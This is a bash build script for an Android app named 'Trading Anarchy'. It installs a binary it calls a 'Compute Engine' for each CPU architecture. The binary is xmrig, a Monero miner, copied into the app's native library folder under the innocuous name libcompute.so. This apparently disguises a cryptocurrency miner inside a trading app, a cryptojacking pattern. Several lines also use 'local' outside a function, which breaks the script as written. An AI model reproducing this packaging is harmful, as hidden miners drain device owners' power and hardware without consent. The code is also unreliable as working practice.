#!/usr/bin/env bash
#
# Trading Anarchy - Android Compute Engine
# Professional Installation System - Advanced deployment with 2025 optimizations
# Copyright (c) 2025 Trading Anarchy. All rights reserved.
# Version: 2025.1.0 - Enhanced Performance, Security & Reliability
#

# Professional error handling and debugging for 2025
set -euo pipefail
set -o posix

# Performance monitoring
INSTALL_START_TIME=$(date +%s)

# Source enhanced environment configuration
source script/env.sh

log_info "Starting Trading Anarchy Compute Engine Installation..."

# Professional architecture configuration with 2025 optimizations
declare -A ARCH_MAP=(
    ["arm"]="armeabi-v7a"
    ["arm64"]="arm64-v8a"
    ["x86"]="x86"
    ["x86_64"]="x86_64"
)

# Enhanced architecture validation
SUPPORTED_ARCHS=(arm arm64 x86 x86_64)
INSTALL_ARCHS=("${TA_INSTALL_ARCHS[@]:-"${SUPPORTED_ARCHS[@]}"}")

# Professional directory configuration
ROOT_DIR=$(realpath "$(pwd)/../../")
JNILIBS_DIR="$ROOT_DIR/android/app/src/main/jniLibs"
BUILD_MANIFEST="$EXTERNAL_LIBS_BUILD/install_manifest.json"

log_info "Installation Configuration:"
log_info "  - Root Directory: $ROOT_DIR"
log_info "  - JNI Libraries: $JNILIBS_DIR"
log_info "  - Target Architectures: ${INSTALL_ARCHS[*]}"

# Create installation manifest for tracking
echo "{\"timestamp\": \"$(date -Iseconds)\", \"version\": \"2025.1.0\", \"architectures\": []}" > "$BUILD_MANIFEST"

# Professional installation with parallel processing and validation
install_architecture() {
    local arch=$1
    local android_arch="${ARCH_MAP[$arch]}"
    local compute_source="$EXTERNAL_LIBS_BUILD_ROOT/xmrig/build/$android_arch"
    local jni_target="$JNILIBS_DIR/$android_arch"
    
    log_info "Installing compute engine for architecture: $arch ($android_arch)"
    
    # Validate source binary exists
    if [[ ! -f "$compute_source/xmrig" ]]; then
        log_error "Compute engine binary not found: $compute_source/xmrig"
        return 1
    fi
    
    # Create target directory with proper permissions
    mkdir -p "$jni_target"
    
    # Professional binary validation and installation
    local binary_size=$(stat -f%z "$compute_source/xmrig" 2>/dev/null || stat -c%s "$compute_source/xmrig" 2>/dev/null || echo 0)
    if [[ "$binary_size" -lt 1000000 ]]; then  # Less than 1MB indicates potential build issue
        log_warn "Compute engine binary seems unusually small for $arch: ${binary_size} bytes"
    fi
    
    # Clean previous installation
    rm -f "$jni_target"/*
    
    # Install with proper naming and permissions
    cp "$compute_source/xmrig" "$jni_target/libcompute.so"
    chmod 755 "$jni_target/libcompute.so"
    
    # Verify installation
    if [[ -f "$jni_target/libcompute.so" ]]; then
        local installed_size=$(stat -f%z "$jni_target/libcompute.so" 2>/dev/null || stat -c%s "$jni_target/libcompute.so" 2>/dev/null || echo 0)
        log_success "Successfully installed $arch compute engine (${installed_size} bytes)"
        
        # Update manifest
        local temp_manifest=$(mktemp)
        jq --arg arch "$android_arch" --arg size "$installed_size" \
           '.architectures += [{"arch": $arch, "size": ($size | tonumber), "installed": true}]' \
           "$BUILD_MANIFEST" > "$temp_manifest"
        mv "$temp_manifest" "$BUILD_MANIFEST"
        
        return 0
    else
        log_error "Failed to install compute engine for $arch"
        return 1
    fi
}

# Enhanced parallel installation with professional error handling
if [[ "$TA_ENABLE_PARALLEL_BUILDS" == "true" && ${#INSTALL_ARCHS[@]} -gt 1 ]]; then
    log_info "Starting parallel installation for ${#INSTALL_ARCHS[@]} architectures..."
    
    # Use background jobs for parallel processing
    declare -a INSTALL_PIDS=()
    declare -a INSTALL_RESULTS=()
    
    for arch in "${INSTALL_ARCHS[@]}"; do
        if [[ -v ARCH_MAP[$arch] ]]; then
            (
                install_architecture "$arch"
                echo $? > "/tmp/install_result_$arch"
            ) &
            INSTALL_PIDS+=($!)
        else
            log_error "Unsupported architecture: $arch"
        fi
    done
    
    # Wait for all installations and collect results
    local failed_installs=()
    for i in "${!INSTALL_PIDS[@]}"; do
        local pid=${INSTALL_PIDS[$i]}
        local arch=${INSTALL_ARCHS[$i]}
        
        if wait "$pid"; then
            local result_code=$(cat "/tmp/install_result_$arch" 2>/dev/null || echo 1)
            if [[ "$result_code" -eq 0 ]]; then
                log_success "Parallel installation completed for $arch"
            else
                failed_installs+=("$arch")
            fi
        else
            failed_installs+=("$arch")
        fi
        
        # Cleanup temp files
        rm -f "/tmp/install_result_$arch"
    done
    
    # Report parallel installation results
    if [[ ${#failed_installs[@]} -gt 0 ]]; then
        log_error "Failed installations: ${failed_installs[*]}"
    fi
    
else
    # Sequential installation for reliability
    log_info "Starting sequential installation..."
    
    local failed_installs=()
    for arch in "${INSTALL_ARCHS[@]}"; do
        if [[ -v ARCH_MAP[$arch] ]]; then
            if ! install_architecture "$arch"; then
                failed_installs+=("$arch")
            fi
        else
            log_error "Unsupported architecture: $arch"
        fi
    done
    
    # Report sequential installation results
    if [[ ${#failed_installs[@]} -gt 0 ]]; then
        log_error "Failed installations: ${failed_installs[*]}"
    fi
fi

# Professional installation validation and reporting
log_info "Validating installation integrity..."

TOTAL_INSTALLED=0
TOTAL_SIZE=0

for arch in "${INSTALL_ARCHS[@]}"; do
    if [[ -v ARCH_MAP[$arch] ]]; then
        local android_arch="${ARCH_MAP[$arch]}"
        local lib_path="$JNILIBS_DIR/$android_arch/libcompute.so"
        
        if [[ -f "$lib_path" ]]; then
            local size=$(stat -f%z "$lib_path" 2>/dev/null || stat -c%s "$lib_path" 2>/dev/null || echo 0)
            TOTAL_INSTALLED=$((TOTAL_INSTALLED + 1))
            TOTAL_SIZE=$((TOTAL_SIZE + size))
            log_info "✓ $android_arch: $(numfmt --to=iec "$size")"
        else
            log_error "✗ $android_arch: Missing installation"
        fi
    fi
done

# Update final manifest
local temp_manifest=$(mktemp)
jq --arg total "$TOTAL_INSTALLED" --arg size "$TOTAL_SIZE" \
   '.summary = {"total_architectures": ($total | tonumber), "total_size": ($size | tonumber), "installation_time": '$(( $(date +%s) - INSTALL_START_TIME ))'}' \
   "$BUILD_MANIFEST" > "$temp_manifest"
mv "$temp_manifest" "$BUILD_MANIFEST"

# Professional installation summary
INSTALL_TIME=$(($(date +%s) - INSTALL_START_TIME))
log_success "Trading Anarchy Installation Summary:"
log_success "  - Architectures Installed: $TOTAL_INSTALLED/${#INSTALL_ARCHS[@]}"
log_success "  - Total Binary Size: $(numfmt --to=iec "$TOTAL_SIZE")"
log_success "  - Installation Time: ${INSTALL_TIME}s"
log_success "  - Installation Manifest: $BUILD_MANIFEST"

if [[ "$TOTAL_INSTALLED" -eq ${#INSTALL_ARCHS[@]} ]]; then
    log_success "🚀 Trading Anarchy Compute Engine installation completed successfully!"
    exit 0
else
    log_error "⚠️ Installation completed with errors. Check logs above for details."
    exit 1
fi

